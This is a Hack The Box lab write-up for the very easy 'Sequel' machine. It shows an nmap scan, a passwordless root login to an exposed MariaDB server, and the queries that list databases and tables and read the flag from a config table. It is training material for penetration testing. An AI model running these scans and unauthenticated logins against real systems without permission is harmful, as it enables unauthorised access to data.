# HTB - Sequel

**Difficulty:** Very Easy  
**Category:** MySQL  
**Date:** 2026  
**Status:** ✅ Completed

---

## Summary

Sequel is a Linux machine running a MariaDB (MySQL) instance that allows unauthenticated access as the root user. By connecting directly to the database and enumerating its contents, it is possible to find the flag stored inside a table.

---

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -p- --min-rate 5000 10.129.x.x
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 3306 | mysql | MariaDB |

Port **3306** is open, which is the default MySQL/MariaDB port.

---

## Exploitation

### Step 1 - Connect to MySQL as Root

Attempted to connect to the database as root with no password:

```bash
mysql -h 10.129.x.x -u root --skip-ssl
```

**Output:**
```
MariaDB [(none)]>
```

Connection was successful with no password required!

### Step 2 - Enumerate Databases

Listed all available databases:

```sql
SHOW DATABASES;
```

**Output:**
```
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

The **htb** database looks interesting!

### Step 3 - Select the Database and List Tables

```sql
USE htb;
SHOW TABLES;
```

**Output:**
```
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

### Step 4 - Retrieve the Flag

Queried the **config** table which is likely to contain sensitive information:

```sql
SELECT * FROM config;
```

**Output:**
```
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | flag                  | HTB{...}                         |
+----+-----------------------+----------------------------------+
```

---



---

## What I Learned

- What MySQL and MariaDB are and how they differ
- How to use **mysql-cli** to connect to a remote database
- MySQL commands: **SHOW DATABASES**, **USE**, **SHOW TABLES**, **SELECT \***
- That databases can be exposed without authentication when misconfigured
- The `--skip-ssl` flag when the server doesn't support SSL
- How the `*` wildcard works in SQL queries

---

## References

- [MySQL - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql)
